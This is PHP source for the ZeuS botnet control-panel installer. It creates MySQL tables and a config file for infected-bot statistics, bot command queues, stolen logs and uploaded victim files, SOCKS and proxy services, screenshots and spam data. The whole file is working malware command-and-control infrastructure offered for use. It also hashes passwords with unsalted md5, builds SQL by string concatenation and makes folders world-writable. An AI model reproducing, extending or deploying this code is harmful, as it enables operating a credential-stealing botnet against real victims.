<?php include_once('../system/global.php');
define('INST_MODULES',MODULE_BOTS_LC_SS | MODULE_LOGS_FS|MODULE_BOTS_PROXY|MODULE_BOTS_SOCKS|MODULE_BOTS_CMDS|MODULE_BOTS|MODULE_LOGS|MODULE_LOGS_FILES|MODULE_USERS|MODULE_LOGS_DB|MODULE_LOGS_TMPS|MODULE_BOTS|MODULE_LOGS_WDB);

$table_ip2c_q="l int unsigned NOT NULL default '0',h int unsigned NOT NULL default '0',c varchar(2) NOT NULL default ''";
$table_users_q="id int unsigned NOT NULL auto_increment,login varchar(10) NOT NULL default '',pass tinytext NOT NULL default '',priv int unsigned NOT NULL default '0',PRIMARY KEY(id),UNIQUE(login)";
$table_stats_q="comp_id varchar(60) NOT NULL default '',country varchar(2) NOT NULL default '--',ftime int unsigned NOT NULL default '0',time int unsigned NOT NULL default '0',ip varchar(15) NOT NULL default '0.0.0.0',inst int unsigned NOT NULL default '0',up int unsigned NOT NULL default '0',bn varchar(4) NOT NULL default '".DEF_BOTNET."',ot int unsigned NOT NULL default '0',UNIQUE(comp_id)";
$table_tmps_q="id int unsigned NOT NULL auto_increment,name tinytext NOT NULL default '',url tinytext NOT NULL default '',pd tinytext NOT NULL default '',PRIMARY KEY(id)";
$table_spam_q="id int unsigned NOT NULL auto_increment,stat bool NOT NULL default '0',filename text NOT NULL default '',filepos int unsigned NOT NULL default '0',subjects text NOT NULL default '',headers text NOT NULL default '',body text NOT NULL default '',PRIMARY KEY(id)";
if(INST_MODULES&MODULE_BOTS)
{
  $table_stats_q.=",lc int unsigned NOT NULL default '0'";
  if(INST_MODULES&MODULE_BOTS_SOCKS)$table_stats_q.=",socks int unsigned NOT NULL default '0'";
  if(INST_MODULES&MODULE_BOTS_PROXY)$table_stats_q.=",proxy int unsigned NOT NULL default '0'";
  if(INST_MODULES&MODULE_BOTS_PROXY||INST_MODULES&MODULE_BOTS_SOCKS)
  {
    $table_stats_q.=",speed int unsigned NOT NULL default '0'";
    $table_bipsp_q="i varchar(15) NOT NULL default '0.0.0.0'";
  } 
  if(INST_MODULES&MODULE_BOTS_CMDS)$table_bcmds_q="id int unsigned NOT NULL auto_increment,id2 int unsigned NOT NULL default '0',lim int unsigned NOT NULL default '0',exc int unsigned NOT NULL default '0',exct int unsigned NOT NULL default '0',c text NOT NULL default '',comps text NOT NULL default '',rcomps longtext NOT NULL default '',cmds blob NOT NULL default '',stat bool NOT NULL default '0',name tinytext NOT NULL default '',bns text NOT NULL default '',PRIMARY KEY(id)";
}

$file_ip2c='geobase.txt';
$file_cfg='../'.FILE_CONFIG;
$login='root';
$pass='';
$mysql_host='localhost';
$mysql_user='root';
$mysql_pass='';
$mysql_db='zeus';
$table_users='users';
$table_stats='stats';
$table_bipsp='bipsp';
$table_ip2c='ip2c';
$table_bcmds='bcmds';
$table_logs='logs';
$table_tmps='tmps';
$table_spam='spam';
$path_logs='.logs';
$path_lfiles='.files';
$opt_logs_db=INST_MODULES&MODULE_LOGS_WDB;
$opt_logs_fs=INST_MODULES&MODULE_LOGS_WFS;
$opt_btont=25;
$opt_lc_ss_format='jpeg';
$opt_lc_ss_quality=30;

define('LNG_TITLE','ZeuS Installer');
define('LNG_SUBTITLE','ZeuS Installer');
define('LNG_DLG_WELCOME_1','This application install and configure your ZeuS on this server. Choise settings and press \'Install\'.');
define('LNG_DLG_WELCOME_2','This application update/repair and reconfigure your ZeuS on this server. Choise settings and press \'Update\'. If you want make new instalation, please remove file \''.$file_cfg.'\'');
define('LNG_DLG_ROOT_LOGIN','Root&nbsp;login:');
define('LNG_DLG_RL_USER','Login&nbsp;(4-10&nbsp;chars):');
define('LNG_DLG_RL_PASS','Password&nbsp;(6-64&nbsp;chars):');
define('LNG_DLG_SQL_SERVER','MySQL&nbsp;server:');
define('LNG_DLG_SQL_HOST','Host:');
define('LNG_DLG_SQL_USER','User:');
define('LNG_DLG_SQL_PASS','Password:');
define('LNG_DLG_SQL_DB','Database:');
define('LNG_DLG_SQL_TABLES','MySQL&nbsp;tables:');
define('LNG_DLG_SQLT_USERS','Users:');
define('LNG_DLG_SQLT_STATS','Statistics:');
define('LNG_DLG_SQLT_USEDIPSP','Used&nbsp;IP\'s&nbsp;for&nbsp;Services:');
define('LNG_DLG_SQLT_IP2C','IP2Country');
define('LNG_DLG_SQLT_BCMDS','Bot&nbsp;commands:');
define('LNG_DLG_SQLT_LOGS','Logs&nbsp;mask:');
define('LNG_DLG_SQLT_TMPS','Logs&nbsp;templates:');
define('LNG_DLG_SQLT_SPAM','Spam&nbsp;data:');
define('LNG_DLG_LOCAL_PATHS','Local&nbsp;paths:');
define('LNG_DLG_LP_LOGS','Uploaded logs:');
define('LNG_DLG_LP_LFILES','Uploaded files:');
define('LNG_DLG_OPTIONS','Options:');
define('LNG_DLG_OPTIONS_DBLOGS','Enable log write to database.');
define('LNG_DLG_OPTIONS_FSLOGS','Enable log write to local path.');
define('LNG_DLG_OPTIONS_BTONT','Online&nbsp;bot&nbsp;timeout:');
define('LNG_DLG_UPDATE','Update');
define('LNG_DLG_INSTALL','Install');
define('LNG_INSTS_ERROR','Error:');
define('LNG_INSTS_CTABLE','Creating table <b>\'%s\'</b>');
define('LNG_INSTS_CTABLE_E','Failed to create table <b>\'%s\'</b>: %s');
define('LNG_INSTS_UTABLE','Updating table <b>\'%s\'</b>');
define('LNG_INSTS_UTABLE_E','Failed to rename table <b>\'%s\'</b> to <b>\'%s\'</b>');
define('LNG_INSTS_AROW_E','Failed to write row in table <b>\'%s\'</b>: %s');
define('LNG_INSTS_FOPEN_E','Failed to open file \'%s\'.');
define('LNG_INSTS_LOGIN_E','Bad format of login data.');
define('LNG_INSTS_SQL_E','Bad format of MySQL server data');
define('LNG_INSTS_SQLT_E','Bad format of MySQL tables data');
define('LNG_INSTS_LP_E','Bad format of local paths data');
define('LNG_INSTS_OPT_BTONT','Bot-online timeout have bad value.');
define('LNG_INST_STEPS','Installation&nbsp;steps:');
define('LNG_INSTS_SQLC','Connecting to MySQL as <b>\'%s\'</b>');
define('LNG_INSTS_SQLC_E','Failed connect to MySQL server: %s');
define('LNG_INSTS_SQLDB','Selecting DB <b>\'%s\'</b>');
define('LNG_INSTS_SQLDB_E1','Failed to create database: %s');
define('LNG_INSTS_SQLDB_E2','Failed to select database: %s');
define('LNG_INSTS_LOGIN_E1','Bad user or password.');
define('LNG_INSTS_LOGIN_E2','User <b>\'%s\'</b> not have permissions on update.');
define('LNG_INSTS_SQLT_FILL','Filling table <b>\'%s\'</b>');
define('LNG_INSTS_SQLT_ADDU','Adding user <b>\'%s\'</b> to table <b>\'%s\'</b>');
define('LNG_INSTS_LP_RENAME','Renaming folder <b>\'%s\'</b> to <b>\'%s\'</b>');
define('LNG_INSTS_LP_CREATE','Creating folder <b>\'%s\'</b>');
define('LNG_INSTS_LP_RENAME_E','Failed to rename folder \'%s\' to \'%s\'');
define('LNG_INSTS_LP_CREATE_E','Failed to create folder \'%s\'');
define('LNG_INSTS_CFG','Writing config file');
define('LNG_INSTS_CFG_E','Failed to write to config file.');
define('LNG_INSTS_COMPLETE_1','Installation complete!');
define('LNG_INSTS_COMPLETE_2','Update complete!');
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"><html><head><title><?=LNG_TITLE?></title><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="stylesheet" href="../theme/style.css" type="text/css"></head><body>
<center><table class="tbl1" width="350"><tr><td colspan="2" class="td1"><?=LNG_SUBTITLE?></td></tr>
<?php 
function PrintError($string,$t=1){if($t)print '<tr><td colspan="2" class="td1">'.LNG_INSTS_ERROR.'</td></tr>';print '<tr><td colspan="2" class="error">&bull; '.$string.'</tr></td>';}
function PrintOK($string){print '<tr><td colspan="2" class="ok">&bull; '.$string.'</tr></td>';}
function CreateDB($table,$data){PrintOK(sprintf(LNG_INSTS_CTABLE,$table));if(!mysql_query('DROP TABLE IF EXISTS '.addslashes($table))||!mysql_query('CREATE TABLE '.addslashes($table).'('.$data.')')){PrintError(sprintf(LNG_INSTS_CTABLE_E,$table,mysql_error()));return 1;}return 0;}
function UpdateDB($table_old,$table_new,$data){PrintOK(sprintf(LNG_INSTS_UTABLE,$table_old));if($table_old!=$table_new&&!mysql_query('RENAME TABLE '.addslashes($table_old).' TO '.addslashes($table_new))){PrintError(sprintf(LNG_INSTS_UTABLE_E,$table_old,$table_new));return 1;}else if(!mysql_query('CREATE TABLE IF NOT EXISTS '.addslashes($table_new).'('.$data.')')){PrintError(sprintf(LNG_INSTS_CTABLE_E,$table_new,mysql_error()));return 1;}$list=explode(',', $data);$c=count($list);for($i=0;$i<$c;$i++)mysql_query('ALTER TABLE '.addslashes($table_new).' ADD '.$list[$i]);return 0;}
function AddRow($table,$query){if(!mysql_query('INSERT INTO '.addslashes($table).' SET '.$query.'')){PrintError(sprintf(LNG_INSTS_AROW_E,$table,mysql_error()));return 1;}return 0;}
function CheckPost($name,$min,$max){$data=isset($_POST[$name])?trim($_POST[$name]):'';$s=strlen($data);if($s<$min||$s>$max)return NULL;return $data;}
function CreatePath($dir, $old=0){$dir_r = '../'.$dir;if($old!==0&&$old!=$dir&&file_exists('../'.$old)){PrintOK(sprintf(LNG_INSTS_LP_RENAME,$old,$dir));if(!is_dir($dir_r)&&!@rename('../'.$old,$dir_r)){PrintError(sprintf(LNG_INSTS_LP_RENAME_E,$old,$dir));;return 0;}@chmod($dir_r,0777);}else{PrintOK(sprintf(LNG_INSTS_LP_CREATE,$dir));if(!is_dir($dir_r)&&!@mkdir($dir_r,0777)){PrintError(sprintf(LNG_INSTS_LP_CREATE_E,$dir));return 0;}}return 1;}

if(isset($_POST['install']))
{
  $error=0;

  //Checking data
  $login      =CheckPost('login',4,10);
  $pass       =CheckPost('pass',6,64);
  $table_logs =CheckPost('table_logs',2,256);
  $table_tmps =CheckPost('table_tmps',2,256);
  $table_spam =CheckPost('table_spam',2,256);
  $table_users=CheckPost('table_users',2,256);
  $table_stats=CheckPost('table_stats',2,256);
  $table_bipsp=CheckPost('table_bipsp',2,256);
  $table_ip2c =CheckPost('table_ip2c',2,256);
  $table_bcmds=CheckPost('table_bcmds',2,256);
  
  $path_logs  =CheckPost('path_logs',1,256);
  $path_lfiles=CheckPost('path_lfiles',1,256);
  
  $opt_logs_db=(isset($_POST['opt_logs_db'])?1:0);
  $opt_logs_fs=(isset($_POST['opt_logs_fs'])?1:0);
  $opt_btont  =CheckPost('opt_btont',1,4);
  
  if($_POST['install']==0)//Update
  {
    if(!file_exists($file_cfg)||!@include_once($file_cfg)){PrintError(sprintf(LNG_INSTS_FOPEN_E,$file_cfg));$error=1;}
    else
    {
      $mysql_host=defined('MYSQL_HOST')?MYSQL_HOST:NULL;
      $mysql_user=defined('MYSQL_USER')?MYSQL_USER:NULL;
      $mysql_pass=defined('MYSQL_PASS')?MYSQL_PASS:NULL;
      $mysql_db  =defined('MYSQL_DB')?MYSQL_DB:NULL;
      if(defined('OPT_LCSSF'))$opt_lc_ss_format=OPT_LCSSF;
      if(defined('OPT_LCSSQ'))$opt_lc_ss_quality=OPT_LCSSQ;
    }
  }
  else
  {
    $mysql_host=CheckPost('mysql_host',4,256);
    $mysql_user=CheckPost('mysql_user',1,256);
    $mysql_pass=CheckPost('mysql_pass',0,256);
    $mysql_db  =CheckPost('mysql_db',  1,256);
  }
  
  if(!$error)
  {
    if($login===NULL||$pass===NULL){PrintError(LNG_INSTS_LOGIN_E,!$error);$error=1;}
    if($mysql_host===NULL||$mysql_user===NULL||$mysql_pass===NULL||$mysql_db===NULL){PrintError(LNG_INSTS_SQL_E,!$error);$error=1;}
    if((INST_MODULES&MODULE_USERS&&$table_users===NULL)||$table_stats===NULL||$table_ip2c===NULL||(INST_MODULES&MODULE_LOGS_DB&&$table_logs===NULL)||(INST_MODULES&MODULE_LOGS_TMPS&&$table_tmps===NULL)||(INST_MODULES&MODULE_SPAMBOT&&$table_spam===NULL)||(INST_MODULES&MODULE_BOTS_CMDS&&$table_bcmds===NULL)){PrintError(LNG_INSTS_SQLT_E,!$error);$error=1;}
    if(INST_MODULES&MODULE_LOGS_FS&&($path_logs===NULL||strcmp($path_logs,$path_lfiles)==0)){PrintError(LNG_INSTS_LP_E,!$error);$error=1;}
    if(INST_MODULES&MODULE_LOGS_FILES&&($path_lfiles===NULL||strcmp($path_logs,$path_lfiles)==0)){PrintError(LNG_INSTS_LP_E,!$error);$error=1;}
    if((INST_MODULES&MODULE_BOTS_PROXY||INST_MODULES&MODULE_BOTS_SOCKS)&&$table_bipsp===NULL){PrintError(LNG_INSTS_SQLT_E,!$error);$error=1;}
    if(INST_MODULES&MODULE_BOTS&&(!is_numeric($opt_btont)||$opt_btont<1||$opt_btont>MAX_BTONT)){PrintError(LNG_INSTS_OPT_BTONT,!$error);$error=1;}
  }
  
  //Connecting to MySQL
  if(!$error)
  {
    print '<tr><td colspan="2" class="td1">'.LNG_INST_STEPS.'</td></tr>';
    PrintOK(sprintf(LNG_INSTS_SQLC,$mysql_user));
    if(!@mysql_connect($mysql_host,$mysql_user,$mysql_pass)){PrintError(sprintf(LNG_INSTS_SQLC_E,mysql_error()));$error=1;}
  }
  
  //Selecting database
  if(!$error)
  {
    PrintOK(sprintf(LNG_INSTS_SQLDB,$mysql_db));
    if(!mysql_query('CREATE DATABASE IF NOT EXISTS '.addslashes($mysql_db))){PrintError(sprintf(LNG_INSTS_SQLDB_E1,mysql_error()));$error=1;}
    else if(!mysql_select_db($mysql_db)){PrintError(sprintf(LNG_INSTS_SQLDB_E2,mysql_error()));$error=1;}
  }
  
  //Checking login password
  if(!$error&&$_POST['install']==0)
  {
    if(!($r=mysql_query('SELECT priv FROM '.TABLE_USERS.' WHERE login=\''.addslashes($login).'\' AND pass=\''.md5($pass).'\' LIMIT 1'))||mysql_affected_rows()!=1||!($m=mysql_fetch_row($r))){PrintError(LNG_INSTS_LOGIN_E1);$error=1;}
    else if(!($m[0]&PRIV_UPGRATECP)){PrintError(sprintf(LNG_INSTS_LOGIN_E2,$login));$error=1;}
  }  
  
  //Creating and filling IP2C
  if(!$error)
  {
    if(defined('TABLE_IP2C'))mysql_query('DROP TABLE IF EXISTS '.TABLE_IP2C);
    if(!($error=CreateDB($table_ip2c,$table_ip2c_q)))
    {
      PrintOK(sprintf(LNG_INSTS_SQLT_FILL,$table_ip2c));
      if(!($f=@file($file_ip2c))){PrintError(sprintf(LNG_INSTS_FOPEN_E,$file_ip2c));$error=1;}
      else
      {
        mysql_query('LOCK TABLES '.$table_ip2c);
        $c_cn=count($f);
        for($i=0;$i<$c_cn;$i++)
        {
          $cn=explode(' ',addslashes($f[$i]),3);
          if(($error=AddRow($table_ip2c,'l=\''.$cn[0].'\',h=\''.$cn[1].'\',c=\''.substr(trim($cn[2]),0,2).'\''))!=0)break;
        }
        mysql_query('UNLOCK TABLES');
      }
      unset($f);  
    }
  }
  
  //Creating and filling users table
  if(!$error)
  {
    if($_POST['install']==0)$error=UpdateDB((defined('TABLE_USERS')?TABLE_USERS:$table_users),$table_users,$table_users_q); 
    else if(!($error=CreateDB($table_users,$table_users_q)))
    {
      PrintOK(sprintf(LNG_INSTS_SQLT_ADDU,$login,$table_users));
      $error=AddRow($table_users,'login=\''.addslashes($login).'\',pass=\''.md5($pass).'\',priv=\''.strval(0xFFFFFFFF).'\'');
    }
  }

  //Creating statistics table
  if(!$error)
  {
    if($_POST['install']==0)$error=UpdateDB((defined('TABLE_STATS')?TABLE_STATS:$table_stats),$table_stats,$table_stats_q);
    else $error=CreateDB($table_stats, $table_stats_q);
  }
    
  //Creating ip's blaclist
  if(!$error&&(INST_MODULES&MODULE_BOTS_PROXY||INST_MODULES&MODULE_BOTS_SOCKS))
  {
    if($_POST['install']==0)$error=UpdateDB((defined('TABLE_BIPSP')?TABLE_BIPSP:$table_bipsp),$table_bipsp,$table_bipsp_q);
    else $error=CreateDB($table_bipsp, $table_bipsp_q);
  }

  //Creating logs templates table
  if(!$error&&INST_MODULES&MODULE_LOGS_TMPS)
  {
    if($_POST['install']==0)$error=UpdateDB((defined('TABLE_TMPS')?TABLE_TMPS:$table_tmps),$table_tmps,$table_tmps_q);
    else $error=CreateDB($table_tmps, $table_tmps_q);
  }

  //Creating spam table
  if(!$error&&INST_MODULES&MODULE_SPAMBOT)
  {
    if($_POST['install']==0)$error=UpdateDB((defined('TABLE_SPAM')?TABLE_SPAM:$table_spam),$table_spam,$table_spam_q);
    else $error=CreateDB($table_spam, $table_spam_q);
  }

  //Creating bots commands table
  if(!$error&&INST_MODULES&MODULE_BOTS_CMDS)
  {
    if($_POST['install']==0)$error=UpdateDB((defined('TABLE_BCMDS')?TABLE_BCMDS:$table_bcmds),$table_bcmds,$table_bcmds_q);
    else $error=CreateDB($table_bcmds, $table_bcmds_q);
  }

  //Creating logs folder
  if(!$error&&INST_MODULES&MODULE_LOGS_FS&&$opt_logs_fs>0)$error=!CreatePath($path_logs,defined('PATH_LOGS')?PATH_LOGS:0);

  //Creating uploaded files folder
  if(!$error&&INST_MODULES&MODULE_LOGS_FILES)$error=!CreatePath($path_lfiles,defined('PATH_LFILES')?PATH_LFILES:0);

  //Creating config file
  if(!$error)
  {
    $flags=0;
    PrintOK(LNG_INSTS_CFG);
    $cfg_data='<?php define(\'MYSQL_HOST\',\''.addslashes($mysql_host).'\');'.
              'define(\'MYSQL_USER\',\''.addslashes($mysql_user).'\');'.
              'define(\'MYSQL_PASS\',\''.addslashes($mysql_pass).'\');'.
              'define(\'MYSQL_DB\',\''.addslashes($mysql_db).'\');'.
              'define(\'TABLE_USERS\',\''.addslashes($table_users).'\');'.
              'define(\'TABLE_STATS\',\''.addslashes($table_stats).'\');'.
              'define(\'TABLE_IP2C\',\''.addslashes($table_ip2c).'\');';
    if(INST_MODULES&MODULE_LOGS)
    {
      $flags|=MODULE_LOGS;
      if(INST_MODULES&MODULE_LOGS_DB)
      {
        $flags|=MODULE_LOGS_DB;
        if($opt_logs_db>0)$flags|=MODULE_LOGS_WDB;
        $cfg_data.='define(\'TABLE_LOGS\',\''.addslashes($table_logs).'\');';
        if(INST_MODULES&MODULE_LOGS_TMPS)
        {
          $flags|=MODULE_LOGS_TMPS;
          $cfg_data.='define(\'TABLE_TMPS\',\''.addslashes($table_tmps).'\');';
        }
      }
      if(INST_MODULES&MODULE_LOGS_FS)
      {
        $flags|=MODULE_LOGS_FS;
        if($opt_logs_fs>0)$flags|=MODULE_LOGS_WFS;
        $cfg_data.='define(\'PATH_LOGS\',\''.addslashes($path_logs).'\');';
      }
      if(INST_MODULES&MODULE_LOGS_FILES)
      {
        $flags|=MODULE_LOGS_FILES;
        $cfg_data.='define(\'PATH_LFILES\',\''.addslashes($path_lfiles).'\');';
      }
    }
    if(INST_MODULES&MODULE_SPAMBOT)
    {
      $flags|=MODULE_SPAMBOT;
      $cfg_data.='define(\'TABLE_SPAM\',\''.addslashes($table_spam).'\');';
    }
    if(INST_MODULES&MODULE_BOTS)
    {
      $flags|=MODULE_BOTS;
      if(INST_MODULES&MODULE_BOTS_SOCKS||INST_MODULES&MODULE_BOTS_PROXY)
      {
        if(INST_MODULES&MODULE_BOTS_SOCKS)$flags|=MODULE_BOTS_SOCKS;
        if(INST_MODULES&MODULE_BOTS_PROXY)$flags|=MODULE_BOTS_PROXY;
        $cfg_data.='define(\'TABLE_BIPSP\',\''.addslashes($table_bipsp).'\');';
      }

      if(INST_MODULES&MODULE_BOTS_LC_SS)
      {
        $flags|=MODULE_BOTS_LC_SS;
        $cfg_data.='define(\'OPT_LCSSF\',\''.addslashes($opt_lc_ss_format).'\');define(\'OPT_LCSSQ\',\''.addslashes($opt_lc_ss_quality).'\');';
      }
      if(INST_MODULES&MODULE_BOTS_CMDS)
      {
        $flags|=MODULE_BOTS_CMDS;
        $cfg_data.='define(\'TABLE_BCMDS\',\''.addslashes($table_bcmds).'\');';
      }
      $cfg_data.='define(\'OPT_BTONT\','.$opt_btont.');';
    }

    if(INST_MODULES&MODULE_USERS)$flags|=MODULE_USERS;
    
    $cfg_data.='define(\'MODULES\',\''.sprintf('%u',$flags).'\');?>';
    
    if(!($f=@fopen($file_cfg,'wt'))){PrintError(LNG_INSTS_CFG_E);$error=1;}
    else{if(!fwrite($f,$cfg_data)){PrintError(LNG_INSTS_CFG_E);$error=1;}fclose($f);}
  }
  if(!$error)die('<tr><td align="center" colspan="2" class="td1">'.($_POST['install']==0?LNG_INSTS_COMPLETE_2:LNG_INSTS_COMPLETE_1).'</td></tr></table></center></body></html>');
}

if(($update=(file_exists($file_cfg)?1:0))&&!isset($_POST['install']))
{
  @include_once($file_cfg);
  $login='';
  $pass='';
  if(defined('MYSQL_HOST'))$mysql_host=MYSQL_HOST;
  if(defined('MYSQL_USER'))$mysql_user=MYSQL_USER;
  if(defined('MYSQL_PASS'))$mysql_pass=MYSQL_PASS;
  if(defined('MYSQL_DB'))$mysql_db=MYSQL_DB;
  if(defined('TABLE_USERS'))$table_users=TABLE_USERS;
  if(defined('TABLE_STATS'))$table_stats=TABLE_STATS;
  if(defined('TABLE_IP2C'))$table_ip2c=TABLE_IP2C;
  if(defined('TABLE_LOGS'))$table_logs=TABLE_LOGS;
  if(defined('TABLE_TMPS'))$table_tmps=TABLE_TMPS;
  if(defined('TABLE_SPAM'))$table_spam=TABLE_SPAM;
  if(defined('TABLE_BCMDS'))$table_bcmds=TABLE_BCMDS;
  if(defined('PATH_LOGS'))$path_logs=PATH_LOGS;
  if(defined('PATH_LFILES'))$path_lfiles=PATH_LFILES;
  $opt_logs_db=MODULES&MODULE_LOGS_WDB;
  $opt_logs_fs=MODULES&MODULE_LOGS_WFS;
  if(defined('OPT_BTONT'))$opt_btont=OPT_BTONT;
}

//Dialog
print '<form method="POST"><input type="hidden" name="install" value="'.($update?0:1).'">'.
      '<tr><td colspan="2"><br>'.($update?LNG_DLG_WELCOME_2:LNG_DLG_WELCOME_1).'<br>&nbsp;</td></tr>'.
      '<tr><td colspan="2" class="td1">'.LNG_DLG_ROOT_LOGIN.'</td></tr>'.
      '<tr><td>'.LNG_DLG_RL_USER.'</td><td style="width:100%"><input style="width:100%" type="text" name="login" value="'.htmlentities($login).'" maxlength="10"></td></tr>'.
      '<tr><td>'.LNG_DLG_RL_PASS.'</td><td><input style="width:100%" type="'.($update ? 'password':'text').'" name="pass" value="'.htmlentities($pass).'" maxlength="64"></td></tr>'.
      '<tr><td colspan="2" class="td1">'.LNG_DLG_SQL_SERVER.'</td></tr>'.
      '<tr><td>'.LNG_DLG_SQL_HOST.'</td><td><input style="width:100%" type="text" '.($update?'disabled ':'').'name="mysql_host" value="'.htmlentities($mysql_host).'"></td></tr>'.
      '<tr><td>'.LNG_DLG_SQL_USER.'</td><td><input style="width:100%" type="text" '.($update?'disabled ':'').'name="mysql_user" value="'.htmlentities($mysql_user).'"></td></tr>'.
      '<tr><td>'.LNG_DLG_SQL_PASS.'</td><td><input style="width:100%" type="text" '.($update?'disabled ':'').'name="mysql_pass" value="'.htmlentities($mysql_pass).'"></td></tr>'.
      '<tr><td>'.LNG_DLG_SQL_DB.'</td><td><input style="width:100%" type="text" '.($update?'disabled ':'').'name="mysql_db" value="'.htmlentities($mysql_db).'"></td></tr>'.
      '<tr><td colspan="2" class="td1">'.LNG_DLG_SQL_TABLES.'</td></tr>'.
      '<tr><td>'.LNG_DLG_SQLT_USERS.'</td><td><input style="width:100%" type="text" name="table_users" value="'.htmlentities($table_users).'"></td></tr>'.
      '<tr><td>'.LNG_DLG_SQLT_IP2C.'</td><td><input style="width:100%" type="text" name="table_ip2c"  value="'.htmlentities($table_ip2c).'"></td></tr>'.
      '<tr><td>'.LNG_DLG_SQLT_STATS.'</td><td><input style="width:100%" type="text" name="table_stats" value="'.htmlentities($table_stats).'"></td></tr>';

if(INST_MODULES&MODULE_BOTS_PROXY||INST_MODULES&MODULE_BOTS_SOCKS)
{
  print '<tr><td>'.LNG_DLG_SQLT_USEDIPSP.'</td><td><input style="width:100%" type="text" name="table_bipsp"  value="'.htmlentities($table_bipsp).'"></td></tr>';
}
if(INST_MODULES&MODULE_BOTS_CMDS)
{
  print '<tr><td>'.LNG_DLG_SQLT_BCMDS.'</td><td><input style="width:100%" type="text" name="table_bcmds"  value="'.htmlentities($table_bcmds).'"></td></tr>';
}
if(INST_MODULES&MODULE_LOGS_DB)
{
  print '<tr><td>'.LNG_DLG_SQLT_LOGS.'</td><td><input style="width:100%" type="text" name="table_logs"  value="'.htmlentities($table_logs).'"></td></tr>';
  if(INST_MODULES&MODULE_LOGS_TMPS)print '<tr><td>'.LNG_DLG_SQLT_TMPS.'</td><td><input style="width:100%" type="text" name="table_tmps"  value="'.htmlentities($table_tmps).'"></td></tr>';
}
if(INST_MODULES&MODULE_SPAMBOT)
{
  print '<tr><td>'.LNG_DLG_SQLT_SPAM.'</td><td><input style="width:100%" type="text" name="table_spam"  value="'.htmlentities($table_spam).'"></td></tr>';
}
if(INST_MODULES&MODULE_LOGS_FS||INST_MODULES&MODULE_LOGS_FILES)
{
  print '<tr><td colspan="2" class="td1">'.LNG_DLG_LOCAL_PATHS.'</td></tr>';
  if(INST_MODULES&MODULE_LOGS_FS)
  {
    print '<tr><td>'.LNG_DLG_LP_LOGS.'</td><td><input style="width:100%" type="text" name="path_logs" value="'.htmlentities($path_logs).'"></td></tr>';
  }
  if(INST_MODULES&MODULE_LOGS_FILES)
  {
    print '<tr><td>'.LNG_DLG_LP_LFILES.'</td><td><input style="width:100%" type="text" name="path_lfiles" value="'.htmlentities($path_lfiles).'"></td></tr>';
  }
}
if(INST_MODULES&MODULE_LOGS||INST_MODULES&MODULE_BOTS)
{
  print '<tr><td colspan="2" class="td1">'.LNG_DLG_OPTIONS.'</td></tr>';
  if(INST_MODULES&MODULE_LOGS)
  {
    if(INST_MODULES&MODULE_LOGS_DB)print '<tr><td colspan="2"><input type="checkbox" name="opt_logs_db"'.($opt_logs_db?' checked':'').'>&nbsp;'.LNG_DLG_OPTIONS_DBLOGS.'</td></tr>';
    if(INST_MODULES&MODULE_LOGS_FS)print '<tr><td colspan="2"><input type="checkbox" name="opt_logs_fs"'.($opt_logs_fs?' checked':'').'>&nbsp;'.LNG_DLG_OPTIONS_FSLOGS.'</td></tr>';
  }
  if(INST_MODULES&MODULE_BOTS)
  {
    print '<tr><td>'.LNG_DLG_OPTIONS_BTONT.'</td><td><input style="width:100%" type="text" name="opt_btont" value="'.htmlentities($opt_btont).'"></td></tr>';
  }
}
print '<tr><td colspan="2" align="center"><br><input class="ism" type="submit" value="'.($update?LNG_DLG_UPDATE:LNG_DLG_INSTALL).'" style="width:80%"></td></tr></form></table></center></body></html>';
?>